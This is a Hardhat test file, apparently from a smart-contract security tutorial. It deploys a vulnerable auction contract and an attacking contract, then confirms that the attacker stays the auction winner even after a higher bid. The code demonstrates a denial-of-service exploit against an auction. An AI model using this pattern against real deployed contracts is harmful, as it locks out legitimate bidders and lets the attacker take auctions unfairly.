const { expect } = require("chai");
const hre = require("hardhat");

describe("Denial of Service", () => {
  it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async () => {
    // Deploy the Good Contract
    const goodContract = await hre.ethers.deployContract("Good", []);
    await goodContract.waitForDeployment();

    // Deploy the Attack Contract
    const attackContract = await hre.ethers.deployContract("Attack", [
      goodContract.target,
    ]);

    await attackContract.waitForDeployment();

    // Now let's attack the Good Contract

    // Get two addresses
    const [_, address1, address2] = await hre.ethers.getSigners();

    // Initially let address1 become the current winner of the auction
    const txn1 = await goodContract.connect(address1).setCurrentAuctionPrice({
      value: hre.ethers.parseEther("1"),
    });

    await txn1.wait();

    // Start the attack and make Attack.sol the current winner of the auction
    const txn2 = await attackContract.attack({
      value: hre.ethers.parseEther("3"),
    });

    await txn2.wait();

    // Now let's try making address2 the current winner of the auction
    const txn3 = await goodContract.connect(address2).setCurrentAuctionPrice({
      value: hre.ethers.parseEther("4"),
    });

    await txn3.wait();

    // Now let's check if the current winner is still attack contract
    expect(await goodContract.currentWinner()).to.equal(attackContract.target);
  });
});
